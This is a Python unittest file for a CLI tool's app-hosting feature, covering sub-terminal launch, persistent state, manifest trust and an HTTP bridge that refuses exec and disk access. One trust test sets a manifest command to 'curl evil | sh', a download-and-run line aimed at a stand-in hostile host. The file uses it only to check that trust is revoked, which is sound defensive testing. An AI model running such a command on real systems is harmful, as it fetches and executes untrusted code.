"""Applications hosted in their own sub-terminal: /helpwo and /app.

The properties pinned here are the ones the design depends on:
  * a persistent application keeps every id the browser and the agent key
    their data by, and a non-persistent one keeps none of them;
  * the parent never mistakes an earlier launch's runtime report for this one;
  * a manifest application reaches only the conversation API, never the disk
    or the shell;
  * the main terminal launches a sub-terminal instead of serving Helpwo itself.
"""
import io
import json
import os
import socket
import sys
import tempfile
import threading
import time
import unittest
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from types import SimpleNamespace
from unittest import mock
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from rich.console import Console

import agent_persistence
import app_host
import helpwo_server
import laintas_cli
import paths


class _Home(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = Path(self._tmp.name) / "home"
        self.home.mkdir()
        self.work = Path(self._tmp.name) / "work"
        self.work.mkdir()
        patcher = mock.patch.object(paths, "LAINTAS_HOME", self.home)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(self._tmp.cleanup)


class LaunchStateTests(_Home):
    def test_persistent_state_is_identical_across_launches(self):
        _, first = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        app_host.update_state(app_host.state_dir("helpwo", str(self.work)), port=4321)
        _, second = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        for key in ("token", "local_agent_id", "conversation_id", "terminal_id"):
            self.assertEqual(first[key], second[key], key)
        self.assertEqual(second["port"], 4321)

    def test_each_folder_has_its_own_state(self):
        other = Path(self._tmp.name) / "other"
        other.mkdir()
        _, a = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        _, b = app_host.ensure_state("helpwo", str(other), persistent=True)
        self.assertNotEqual(a["token"], b["token"])
        self.assertNotEqual(a["conversation_id"], b["conversation_id"])

    def test_non_persistent_state_is_fresh_every_launch(self):
        _, first = app_host.ensure_state("demo", str(self.work), persistent=False)
        _, second = app_host.ensure_state("demo", str(self.work), persistent=False)
        for key in ("token", "local_agent_id", "conversation_id"):
            self.assertNotEqual(first[key], second[key], key)

    def test_switching_to_persistent_does_not_inherit_throwaway_ids(self):
        _, throwaway = app_host.ensure_state("demo", str(self.work), persistent=False)
        _, kept = app_host.ensure_state("demo", str(self.work), persistent=True)
        self.assertNotEqual(throwaway["token"], kept["token"])

    def test_state_file_is_private(self):
        directory, _ = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        mode = os.stat(directory / "state.json").st_mode & 0o777
        self.assertEqual(mode, 0o600)


class RuntimeHandshakeTests(_Home):
    def test_a_report_from_an_earlier_launch_is_ignored(self):
        directory = app_host.state_dir("helpwo", str(self.work))
        app_host.write_runtime(directory, "old", status="ready", url="http://stale")
        result = app_host.wait_runtime(directory, "new", timeout=0.3, poll=0.05)
        self.assertEqual(result["status"], "timeout")

    def test_the_matching_report_is_returned(self):
        directory = app_host.state_dir("helpwo", str(self.work))

        def later():
            time.sleep(0.1)
            app_host.write_runtime(directory, "new", status="ready", url="http://ok")

        threading.Thread(target=later).start()
        result = app_host.wait_runtime(directory, "new", timeout=3, poll=0.02)
        self.assertEqual(result["url"], "http://ok")

    def test_a_dead_process_ends_the_wait(self):
        directory = app_host.state_dir("helpwo", str(self.work))
        result = app_host.wait_runtime(directory, "x", timeout=5, alive=lambda: False)
        self.assertEqual(result["status"], "exited")


class ManifestTests(_Home):
    def _write(self, directory, name, data):
        directory.mkdir(parents=True, exist_ok=True)
        (directory / f"{name}.json").write_text(json.dumps(data), encoding="utf-8")

    def test_valid_manifest_parses(self):
        manifest, reason = app_host.parse_manifest(
            {"name": "notes", "command": "node s.js", "persistence": "workspace"}, "/x.json")
        self.assertEqual(reason, "")
        self.assertEqual(manifest.persistence, "workspace")

    def test_invalid_manifests_are_refused_with_a_reason(self):
        cases = [
            {"name": "helpwo"},
            {"name": "Bad Name"},
            {"name": "ok", "persistence": "forever"},
            {"name": "ok", "port": 70000},
            {"name": "ok", "shell": True},
            {"name": "ok", "prompt": 3},
        ]
        for data in cases:
            with self.subTest(data=data):
                manifest, reason = app_host.parse_manifest(data, "/x.json")
                self.assertIsNone(manifest)
                self.assertTrue(reason)

    def test_project_manifest_shadows_user_manifest_and_problems_are_reported(self):
        self._write(app_host.user_manifest_dir(), "notes", {"name": "notes", "description": "user"})
        self._write(app_host.project_manifest_dir(str(self.work)), "notes",
                    {"name": "notes", "description": "project"})
        (app_host.user_manifest_dir() / "broken.json").write_text("{", encoding="utf-8")
        found, problems = app_host.discover_manifests(str(self.work))
        self.assertEqual(found["notes"].description, "project")
        self.assertEqual(found["notes"].scope, "project")
        self.assertEqual(len(problems), 1)

    def test_trust_is_lost_when_the_manifest_changes(self):
        directory = app_host.user_manifest_dir()
        self._write(directory, "notes", {"name": "notes", "command": "true"})
        manifest = app_host.discover_manifests(str(self.work))[0]["notes"]
        self.assertFalse(app_host.is_trusted(manifest))
        app_host.trust(manifest)
        self.assertTrue(app_host.is_trusted(manifest))
        self._write(directory, "notes", {"name": "notes", "command": "curl evil | sh"})
        changed = app_host.discover_manifests(str(self.work))[0]["notes"]
        self.assertFalse(app_host.is_trusted(changed))
        self.assertTrue(app_host.revoke("notes"))
        self.assertFalse(app_host.revoke("notes"))


class PromptSectionTests(unittest.TestCase):
    def tearDown(self):
        app_host._active = None

    def test_no_section_in_an_ordinary_process(self):
        app_host._active = None
        self.assertEqual(app_host.render_prompt_section(), "")

    def test_helpwo_section_uses_its_own_prompt(self):
        app_host.activate("helpwo", app_host.HELPWO_AGENT_PROMPT, builtin=True)
        section = app_host.render_prompt_section()
        self.assertIn('name="helpwo"', section)
        self.assertIn("Helpwo web app", section)

    def test_manifest_prompt_is_attributed_to_its_author(self):
        app_host.activate("notes", "Summarise notes.", builtin=False)
        section = app_host.render_prompt_section()
        self.assertIn("written by its author", section)
        self.assertIn("Summarise notes.", section)


class ConversationAliasTests(unittest.TestCase):
    def test_primary_is_saved_under_the_application_conversation(self):
        with tempfile.TemporaryDirectory() as raw, \
                mock.patch.object(agent_persistence, "AGENTS_DIR", Path(raw)):
            agent = SimpleNamespace(id="primary", name="primary",
                                    chat_history=[{"role": "user", "content": "hi"}],
                                    state={}, profile=None, active_assignment=None,
                                    assignment_history=[])
            agent_persistence.set_storage_alias("primary", "app-helpwo-abc")
            try:
                self.assertTrue(agent_persistence.save_agent_state(agent))
                self.assertTrue((Path(raw) / "app-helpwo-abc.json").exists())
                self.assertFalse((Path(raw) / "primary.json").exists())
                loaded = agent_persistence.load_agent_state("primary")
                self.assertEqual(loaded["chat_history"][0]["content"], "hi")
            finally:
                agent_persistence.set_storage_alias("primary", None)
            self.assertIsNone(agent_persistence.load_agent_state("primary"))


class _OfflineRegistry:
    REMOTE_CONTROL_KINDS = frozenset({"abort", "approval-response", "disconnect", "term-close"})

    def __init__(self):
        self.agent_id = None
        self.agent_name = "app"
        self.parent_remote_id = None
        self.terminal_meta = None
        self._state_cb = None
        self._chat_cb = None
        self._remote_executor = ThreadPoolExecutor(max_workers=1)
        self._remote_control_executor = ThreadPoolExecutor(max_workers=1)
        self._remote_capacity_lock = threading.Condition(threading.RLock())
        self._remote_accepted = {"task": 0, "control": 0}
        self.received = []
        self._push_events = lambda events, req_id=None: None

    def _reserve_remote_capacity(self, control):
        return True

    def _run_bounded_remote(self, message, *_args):
        self.received.append(message)

    def close(self):
        self._remote_executor.shutdown(wait=True)
        self._remote_control_executor.shutdown(wait=True)


class AppBridgeTests(unittest.TestCase):
    def setUp(self):
        self.registry = _OfflineRegistry()
        self._cwd = os.getcwd()
        self._tmp = tempfile.TemporaryDirectory()
        os.chdir(self._tmp.name)
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]
        ok, msg = helpwo_server.start_server(
            self.registry, port=port, session={}, token="tok",
            agent_id="local-notes-abc",
            app_profile={"name": "notes", "allowed_kinds": app_host.APP_ALLOWED_KINDS})
        self.assertTrue(ok, msg)
        self.base = f"http://127.0.0.1:{port}"
        self.auth = {"Authorization": "token tok"}

    def tearDown(self):
        helpwo_server.stop_server()
        os.chdir(self._cwd)
        self.registry.close()
        self._tmp.cleanup()

    def _post(self, path, body):
        return urlopen(Request(self.base + path, data=json.dumps(body).encode(),
                               headers={**self.auth, "Content-Type": "application/json"},
                               method="POST"), timeout=2)

    def test_the_agent_is_listed_under_its_stable_id(self):
        agents = json.load(urlopen(Request(self.base + "/api/agents", headers=self.auth), timeout=2))
        self.assertEqual(agents[0]["id"], "local-notes-abc")
        self.assertEqual(agents[0]["app"], "notes")

    def test_chat_is_accepted(self):
        reply = json.load(self._post("/api/agents/local-notes-abc/send",
                                     {"kind": "chat", "reqId": "r1", "payload": {"message": "hi"}}))
        self.assertTrue(reply["ok"])

    def test_exec_is_refused(self):
        with self.assertRaises(HTTPError) as refused:
            self._post("/api/agents/local-notes-abc/send",
                       {"kind": "exec", "reqId": "r2", "payload": {"command": "id"}})
        self.assertEqual(refused.exception.code, 403)
        self.assertEqual(self.registry.received, [])

    def test_disk_shell_and_static_routes_do_not_exist(self):
        for method, path in (("GET", "/api/local-fs/root"), ("GET", "/api/local-runtime"),
                             ("POST", "/api/local-exec"), ("POST", "/api/local-fs/write"),
                             ("GET", "/index.html"), ("PUT", "/api/local-proxy/3000/")):
            with self.subTest(method=method, path=path):
                request = Request(self.base + path, headers={**self.auth, "Content-Type": "application/json"},
                                  data=(b"{}" if method != "GET" else None), method=method)
                with self.assertRaises(HTTPError) as refused:
                    urlopen(request, timeout=2)
                self.assertEqual(refused.exception.code, 404)

    def test_the_token_is_still_required(self):
        with self.assertRaises(HTTPError) as refused:
            urlopen(self.base + "/api/agents", timeout=2)
        self.assertEqual(refused.exception.code, 403)


@unittest.skipUnless(os.name == "posix", "process groups")
class AppProcessTests(_Home):
    def test_stop_ends_the_whole_process_group(self):
        log = self.home / "app.log"
        proc = app_host.spawn_app_process(
            "sleep 30 & echo $LAINTAS_APP_NAME; wait", cwd=str(self.work),
            env_extra={"LAINTAS_APP_NAME": "notes"}, log_path=log)
        deadline = time.time() + 3
        while time.time() < deadline and "notes" not in (log.read_text() if log.exists() else ""):
            time.sleep(0.05)
        self.assertIn("notes", log.read_text())
        app_host.stop_app_processes(timeout=3)
        self.assertIsNotNone(proc.poll())
        # The backgrounded sleep is reparented when its shell dies; give init
        # a moment to reap it before asking whether the group is empty.
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.killpg(proc.pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        with self.assertRaises(ProcessLookupError):
            os.killpg(proc.pid, 0)


class _Capture:
    def __enter__(self):
        self.buffer = io.StringIO()
        self._old = laintas_cli.console
        laintas_cli.console = Console(file=self.buffer, force_terminal=False, width=200)
        return self

    def __exit__(self, *exc):
        laintas_cli.console = self._old

    @property
    def text(self):
        return self.buffer.getvalue()


class CommandTests(_Home):
    def setUp(self):
        super().setUp()
        self._cwd = os.getcwd()
        os.chdir(self.work)
        self.addCleanup(os.chdir, self._cwd)
        self.addCleanup(laintas_cli._APP_LAUNCHES.clear)
        self.addCleanup(laintas_cli._HOSTED_APP.clear)
        depth = mock.patch.object(laintas_cli, "_REPL_PROCESS_DEPTH", 0)
        depth.start()
        self.addCleanup(depth.stop)

    def test_helpwo_in_the_main_terminal_launches_a_persistent_sub_terminal(self):
        registry = mock.Mock(agent_id="host-1", workspace_path=None)
        with _Capture(), \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch, \
                mock.patch("helpwo_server.start_server") as start:
            laintas_cli._cmd_helpwo("--port 9000", ["/helpwo", "--port", "9000"], registry, {})
        start.assert_not_called()
        launch.assert_called_once()
        args, kwargs = launch.call_args
        self.assertEqual(args[0], "helpwo")
        self.assertTrue(kwargs["persistent"])
        self.assertEqual(kwargs["options"]["port"], 9000)

    def test_helpwo_inside_a_sub_terminal_serves_in_place(self):
        registry = mock.Mock(agent_id=None, workspace_path=None)
        with _Capture(), \
                mock.patch.object(laintas_cli, "_REPL_PROCESS_DEPTH", 1), \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch, \
                mock.patch.object(laintas_cli, "_helpwo_start_in_process") as here:
            laintas_cli._cmd_helpwo("", ["/helpwo"], registry, {})
        launch.assert_not_called()
        here.assert_called_once()

    def test_launch_builds_an_app_sub_terminal_and_reports_readiness(self):
        started = []

        class _Sub:
            def __init__(self, command):
                self.command = command
                started.append(command)

            def start(self):
                pass

            def is_alive(self):
                return True

            def read_output(self, timeout=0):
                return ""

            def close(self):
                pass

        registered = {}

        def _register(sub, command, depth, name=None, parent_terminal=None):
            registered.update(command=command, name=name)
            directory = app_host.state_dir("helpwo", str(self.work))
            launch_id = sub.command.split("--app-launch-id ")[1].split(" ")[0]
            app_host.write_runtime(directory, launch_id, status="ready",
                                   url="http://127.0.0.1:1", open_url="http://127.0.0.1:1/?token=t")
            return name

        with _Capture() as out, \
                mock.patch.object(laintas_cli, "SubTerminalSession", _Sub), \
                mock.patch.object(laintas_cli, "register_terminal", side_effect=_register), \
                mock.patch.object(laintas_cli, "get_terminal", return_value=None), \
                mock.patch.object(laintas_cli, "_open_external_url") as opened, \
                mock.patch.object(laintas_cli, "_can_open_graphical_browser", return_value=True), \
                mock.patch.object(laintas_cli.time, "sleep"):
            runtime = laintas_cli._launch_app_subterminal(
                "helpwo", persistent=True, options={"remote": False},
                agent_registry=mock.Mock(agent_id="host-1"), open_url=True, wait=True)
        self.assertEqual(runtime["status"], "ready")
        self.assertEqual(registered, {"command": "laintas-cli app:helpwo", "name": "helpwo"})
        command = started[0]
        for fragment in ("--depth 1", "--terminal-name helpwo", "--app helpwo",
                         "--remote-parent-id host-1", "LAINTAS_TERMINAL_ID=app-helpwo-"):
            self.assertIn(fragment, command)
        opened.assert_called_once_with("http://127.0.0.1:1/?token=t")
        self.assertIn("running in sub-terminal", out.text)

    def test_no_console_browser_is_started_without_a_display(self):
        runtime = {"status": "ready", "open_url": "http://127.0.0.1:1/?token=t"}
        with _Capture(), \
                mock.patch.dict(os.environ, {}, clear=True), \
                mock.patch.object(laintas_cli.sys, "platform", "linux"), \
                mock.patch.object(laintas_cli, "_open_external_url") as opened:
            laintas_cli._report_app_runtime("helpwo", runtime, open_url=True)
        opened.assert_not_called()

    def test_a_users_terminal_with_the_same_name_is_not_taken_over(self):
        existing = mock.Mock(command="bash", session=mock.Mock(is_alive=lambda: True))
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "get_terminal", return_value=existing), \
                mock.patch.object(laintas_cli, "SubTerminalSession") as sub:
            result = laintas_cli._launch_app_subterminal(
                "helpwo", persistent=True, options={}, agent_registry=None, open_url=False)
        self.assertIsNone(result)
        sub.assert_not_called()
        self.assertIn("already exists", out.text)

    def test_helpwo_stop_closes_only_its_own_sub_terminal(self):
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "get_terminal",
                                  return_value=mock.Mock(command="laintas-cli app:helpwo")), \
                mock.patch.object(laintas_cli, "unregister_terminal") as unregister, \
                mock.patch("helpwo_server.is_running", return_value=False):
            laintas_cli._cmd_helpwo("stop", ["/helpwo", "stop"], mock.Mock(agent_id=None), {})
        unregister.assert_called_once_with("helpwo")
        self.assertIn("sub-terminal closed", out.text)

    def test_app_start_refuses_an_untrusted_manifest(self):
        directory = app_host.user_manifest_dir()
        directory.mkdir(parents=True)
        (directory / "notes.json").write_text(json.dumps({"name": "notes"}), encoding="utf-8")
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "notes"], mock.Mock())
        launch.assert_not_called()
        self.assertIn("not trusted", out.text)

    def test_app_start_launches_a_trusted_manifest_with_its_persistence(self):
        directory = app_host.user_manifest_dir()
        directory.mkdir(parents=True)
        (directory / "notes.json").write_text(
            json.dumps({"name": "notes", "persistence": "workspace"}), encoding="utf-8")
        app_host.trust(app_host.discover_manifests(str(self.work))[0]["notes"])
        with _Capture(), mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "notes"], mock.Mock())
        launch.assert_called_once()
        self.assertTrue(launch.call_args.kwargs["persistent"])

    def test_app_refers_helpwo_to_its_own_command(self):
        with _Capture() as out, mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "helpwo"], mock.Mock())
        launch.assert_not_called()
        self.assertIn("/helpwo", out.text)

    def test_argument_contracts(self):
        for command in ("/app", "/app list", "/app start notes", "/app trust notes"):
            with self.subTest(command=command):
                action, _raw, parts = laintas_cli._parse_slash_command(command)
                laintas_cli._validate_slash_args(action, parts[1:])
        action, _raw, parts = laintas_cli._parse_slash_command("/app start notes extra")
        with self.assertRaises(Exception):
            laintas_cli._validate_slash_args(action, parts[1:])


if __name__ == "__main__":
    unittest.main()
